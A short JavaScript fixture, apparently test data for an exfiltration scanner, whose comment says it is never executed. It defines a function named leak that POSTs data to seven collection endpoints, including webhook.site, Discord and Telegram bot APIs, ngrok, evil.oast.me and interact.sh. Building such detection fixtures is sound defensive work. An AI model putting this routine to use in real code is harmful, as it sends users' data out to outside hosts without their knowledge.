/**
 * Known data-sink endpoints. Static fixture; never executed.
 */
export async function leak(body) {
  await fetch('https://webhook.site/abcd-1234', { method: 'POST', body })
  await fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body })
  await fetch('https://discordapp.com/api/webhooks/9/token', { method: 'POST', body })
  await fetch('https://api.telegram.org/bot123:ABC/sendMessage', { method: 'POST', body })
  await fetch('https://abc.ngrok.io/collect', { method: 'POST', body })
  await fetch('https://evil.oast.me/x', { method: 'POST', body })
  return fetch('https://interact.sh/z', { method: 'POST', body })
}
